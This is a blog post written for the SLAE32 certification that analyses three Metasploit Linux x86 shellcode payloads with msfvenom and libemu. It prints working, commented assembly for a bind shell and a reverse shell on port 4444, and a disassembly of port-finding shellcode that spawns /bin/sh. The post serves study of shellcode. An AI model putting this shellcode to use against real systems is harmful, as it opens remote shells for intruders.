
---
layout: single
title: Metasploit Shellcode Analysis - SLAE32 Fifth Exam Assignment
date: 2020-7-03
classes: wide
header:
  teaser: /images/metasploit.jpg
tags:
  -SLAE
--- 

## Introduction
Hello Everyone!
This blog post is dedicated to Assignment 5 of the SLAE32 Exam, which is to analyze 3 different Metasploit x86 shellcode samples.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/metasploit.jpg">
</p>

## Assignment 5 - Analyzing Metasploit Shellcode Payloads


There are 3 main instructions provided to us in this assignment:
- [ ] Pick 3 shellcode samples created with msfvenom for Linux x86.
- [ ] Disassemble and analyze the functionality of the shellcode using Libemu/GDB/Ndisasm.
- [ ] Walking through the analysis.

The 3 payloads which i have decided to focus on are:

- [ ] linux/x86/shell_bind_tcp
- [ ] linux/x86/shell_reverse_tcp
- [ ] linux/x86/shell_find_port

## Installing Libemu

First, i will describe how to use Libemu inorder to analyze and inspect shellcodes in general, as i elaborated in previous blogposts of mine.

Libemu Offers basic shellcode detection and linux x86 emulation with use of GetPc heuristics.
You can install the library in two ways:

- [ ] You can download it by visiting <http://libemu.carnivore.it/>
- [ ] You can install it by using the relevant github page, following the next commands:
```bash
git clone https://github.com/buffer/libemu
cd libemu
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
```

As a general template of workflow, you should follow along the instructions which will be presented below, and just change the selected module:

## Using Libemu

After we have installed Libemu successfully, we will use it to analyze the MSF **Generic** Payload, Libemu will provide us with graphical overview of the shellcode,which will come in handy during this assignment.

Now, i will use the "sctest" tool within Libemu, which is a tool used for detecting and analyzing shellcode.

* Note: sctest requires input data in form of raw bytes, so we have to convert our shellcode into raw data first. 

First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/**GENERIC PAYLOAD** -f raw > **GENERIC**.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the bind_shell.

```bash
cat **GENERIC**.bin | ./sctest -vvv -Ss 10000 -G **GENERIC**_shellcode.dot
dot **GENERIC**_shellcode.dot -T png > **GENERIC**_shellcode.png
```
where:
* -v, --verbose : be verbose, can be used multiple times, f.e. -vv
* -S, --stdin : read shellcode/buffer from stdin
* -s INTEGER : max number of steps to run
* -G FILEPATH : save a dot formatted callgraph in filepath
* -T png FILEPATH : Transform the given file into png image.

We will be presented with graphical representation by visiting the **GENERIC**_shellcode.png

Which we can then analyze and infer what main syscalls are being used by the payload.

Now, i will follow along this template analyzing my selcted msf payloads.

## Analyzing the Metasploit Bind Shell Payload

First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/shell_bind_tcp -f raw > bindshell.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the bind_shell.

```bash
cat bindshell.bin | ./sctest -vvv -Ss 10000 -G bindshell_shellcode.dot
dot bindshell_shellcode.dot -T png > bindshell_shellcode.png
```
where:
* -v, --verbose : be verbose, can be used multiple times, f.e. -vv
* -S, --stdin : read shellcode/buffer from stdin
* -s INTEGER : max number of steps to run
* -G FILEPATH : save a dot formatted callgraph in filepath
* -T png FILEPATH : Transform the given file into png image.

We will be presented with this graphical presentation by visiting the bindshell_shellcode.png

![bindshelllibemu](/images/bindshell_shellcode.png)

As we can infer from the graphical presentation, there are 6 main Syscall stages to assemble when creating Bind_Shell Shellcode.

- [ ] Create the socket.
- [ ] Bind the socket.
- [ ] Listen for inbound connection.
- [ ] Accept inbound connection.
- [ ] Duplicate the file descriptors using dup2
- [ ] Execute /bin/sh with execve

Analyzing the code within the corresponding lines:

```c
; Filename: bind_shell.nasm
; Author:  Gal Nagli
; Blog:  naglinagli.github.io

global _start			

section .text
_start:
	
; setting up the socket
       xor eax, eax    ; zeroing out the eax register
       mov al, 0x66    ; hex sys_socketcall (102 in decimal)

       xor ebx, ebx    ; zeroing out the ebx register
       mov bl, 0x1     ; assigning 1 to ebx register (SYS_SOCKET)

       xor esi, esi    ; zeroing out the esi register
       push esi        ; push 0 to the stack (IPPROTO_IP)
       push ebx        ; push 1 to the stack (SOCK_STREAM)
       push 0x2        ; push 2 to the stack (AF_INET)

       mov ecx, esp    ; keep 1st argument address in ecx
       int 0x80         ; syscall

; Bind the socket

       xchg edi, eax   ; save the file descriptor returned to eax in the edi register

       xor eax, eax
       mov al, 0x66    ; making sure we are on the socketcall syscall.

       push esi        ; esi value is 0, specifing the bind address (0.0.0.0)
       push word 0x5C11        ; push the port number (4444)

       inc ebx         ; ebx value is 2, (SYS_BIND)
       push bx

       mov ecx, esp    ; keep 1st argument address in ecx.

       push byte 16    ; push the address length (addrlen)
       push ecx        ; sockaddr structure
       push edi        ; socketfd (file descriptors)
       mov ecx, esp    ; ecx holds the args array for the syscall
       int 0x80        ; init syscall

; Listen for inbound connection

       xor eax,eax
       xor ebx,ebx

       mov al, 0x66
       mov bl, 0x4     ; ebx value is now 4, (SYS_LISTEN)

       push esi        ; push the value 0 as the backlog
       push edi        ; push the file descriptors
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall

; Accept inbound connection request

       mov al, 0x66
       inc bl          ; ebx value is not 5, (SYS_ACCEPT)
       push esi        ; push NULL as the addrlen
       push esi        ; push NULL as the sockaddr structure
       push edi        ; push the file descriptor
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall

; Redirect the file descriptors using dup2

       xchg ebx, eax   ; Moving the file descriptor to ebx
       xor ecx, ecx    ; clearing ecx before using the loop
       mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper

; Execute /bin/sh with execve

       xor eax, eax
       push eax

       ; PUSH //bin/sh (8 bytes)

       push 0x68732f2f
       push 0x6e69622f

       mov ebx, esp

       push eax
       mov edx, esp

       push ebx
       mov ecx, esp


       mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
       int 0x80
```

Using the bind_tcp_shell payload will spawn a bind shell on port 4444

## Analyzing the Metasploit Reverse TCP Shell Payload

First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/shell_reverse_tcp -f raw > reverseshell.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the reverse_shell.

```bash
cat reverseshell.bin | ./sctest -vvv -Ss 10000 -G reverse_shellcode.dot
dot reverse_shellcode.dot -T png > reverse_shellcode.png
```
where:
* -v, --verbose : be verbose, can be used multiple times, f.e. -vv
* -S, --stdin : read shellcode/buffer from stdin
* -s INTEGER : max number of steps to run
* -G FILEPATH : save a dot formatted callgraph in filepath
* -T png FILEPATH : Transform the given file into png image.

We will be presented with this graphical presentation by visiting the reverse_shellcode.png

![reverseshelllibemu](/images/reversetcplibemu.png)

As we can infer from the graphical presentation, there are 4 main Syscall stages to assemble when creating Reverse_Shell Shellcode.

- [ ] Create the socket
- [ ] Connect to the specified IP and port
- [ ] Duplicate the file descriptors using dup2
- [ ] Execute /bin/sh via execve

Analyzing the code within the corresponding lines:


```c
; Filename: reverse_shell.nasm
; Author:  Gal Nagli
; Blog:  naglinagli.github.io

global _start			

section .text
_start:
	
; setting up the socket
	xor ebx, ebx    ; zeroing out the ebx register
	mul ebx	       ; zeroing out eax and edx registers

	mov al, 0x66    ; setting eax to the socket_call SYSCALL
	mov bl, 0x01     ; assigning 1 to ebx register (SYS_SOCKET)	 
  
	push edx        ; push 0 to the stack (IPPROTO_IP)
	push ebx        ; push 1 to the stack (SOCK_STREAM)
	push 0x2        ; push 2 to the stack (AF_INET)

	mov ecx, esp    ; keep 1st argument address in ecx
	int 0x80         ; syscall
	mov edi, eax	; saving the file descriptor

; Connection
	
	xor ebx, ebx	; zeroing out ebx register
	mul ebx		; zeroing out eax and edx registers
	mov al, 0x66	
	mov bl, 0x03	; set ebx value to 3, (SYS_CONECT)
	
	mov ecx, 0x03020280	; set ecx register 3.2.2.128
	sub ecx, 0x02020201	; decrement 2.1.1.1
	push ecx		; push localhost (127.0.0.1) NULL-FREE
	push word 0x5C11       ; push the port number (4444)
	push word 0x02	       ; AF_INET syscall
		
	mov ecx, esp    ; keep 1st argument address in ecx.
	push byte 0x10    ; push the address length (addrlen)
	push ecx        ; sockaddr structure
	push edi        ; socketfd (file descriptors)
	mov ecx, esp    ; ecx holds the args array for the syscall
	int 0x80        ; init syscall



; Redirect the file descriptors using dup2

	pop ebx		; moving the file descriptor from the stack
	xor eax, eax	; zeroing out the eax register
	xor ecx, ecx    ; clearing ecx before using the loop
	mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper

; Execute /bin/sh with execve

       xor ebx, ebx
       mul ebx

       ; PUSH //bin/sh (8 bytes)
	push edx	; push nullbyte to the stack
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp
	mov ecx, edx

	mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
	int 0x80
```

Using the reverse_tcp_shell payload will spawn a reverse shell on port 4444

## Analyzing the Metasploit shell_find_port Payload

First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/shell_find_port -f raw > shell_find_port.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the reverse_shell.

```bash
cat shell_find_port.bin | ./sctest -vvv -Ss 10000 -G shell_find_port_shellcode.dot
dot shell_find_port_shellcode.dot -T png > shell_find_port_shellcode.png
```

We will be presented with this graphical presentation by visiting the shell_find_port_shellcode.png

![shell_find_port_shellcode](/images/shell_find_port_shellcode.png)

As we can infer from the graphical presentation, there is 1 main Syscall used when using the shell_find_port Shellcode.

- [ ] get_peer_name

Analyzing the code within the corresponding lines:

```c
	xor ebx,ebx     	 ; zeroing out EBX = 0
	push ebx     		 ; pushing 0 to the stack
	mov edi,esp     	 ; storing the current stack pointer to EDI
	push byte +0x10      	 ; push the address length to the stack
	push esp     		 ; push the pointer to the address length on the stack
	push edi     		 ; push pointer to the stack
	push ebx     		 ; push sockfd to start to search
	mov ecx,esp  	  	 ; move the current stack pointer to the ECX register
	mov bl,0x7     		 ; load the 0x7 SYS_GETPEERNAME value in BL (INIT the corrensponding SYSCALL)
	
loop_label:     

	inc dword [ecx]     	 ; increment file descriptor used in the loop to go to the "next" socket connection  
	push byte +0x66    	 ; push 0x66 (socketcall number) on the stack
	pop eax        		 ; pop 0x66 in EAX (socketcall systemcall)
	int 0x80      		 ; execute socketcall systemcall
	cmp word [edi+0x2],0x5C11 		 ; compare the socket source port with "4444" little endian value
	jnz 0xe        		 ; if the value does not match we go back to loop_label
	; if the there is a match
	
dup_loop_label:      
	pop ebx        		 ; pop sockfd into the EBX register
	push byte +0x2      	 ; push 2 on the stack (that will be used to perform 3 iterations in dup2 2,1,0)
	pop ecx        		 ; load the pushed 2 in the ECX register
	mov al,0x3f    	         ; push dup2 syscall value in AL
	int 0x80      		 ; execute dup2 systemcall
	dec ecx        		 ; decrement our counter (From 2 to 0 stdin, stdout and stderr.)
	jns 0x21      		 ; if we didn't reach the end (-1) we will loop back to dup_loop_label
	
; calling the execve syscall
	push eax     		 ; EAX register should now be 0
	push dword 0x68732f2f    ; hs//
	push dword 0x6e69622f    ; nib/
	mov ebx,esp    		 ; load a pointer to /bin//sh in EBX register
	push eax      		 ; push the null function argument to the EAX register
	push ebx      		 ; push /bin//shNULL pointer to EBX
	mov ecx,esp    		 ; move pointer to /bin//shNULL into ECX
	cdq       		 ; zeroing out the EAX register
	mov al,0xb   	 	 ; move pointer to /bin//shNULL into the ECX register
	int 0x80   		 ; execute execve systemcall and pop our shell
```
Using the shell_find_port payload will spawn a shell on an established connection on 4444 port.

And that's it for the fifth assignment!

## References

* get_peer_name syscall - <https://man7.org/linux/man-pages/man2/getpeername.2.html>
* bind_shell blogpost - <https://naglinagli.github.io/shellbind/>
* reverse_tcp_shell blogpost- <https://naglinagli.github.io/reverseshell/>


## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543


Cheers,
Gal.
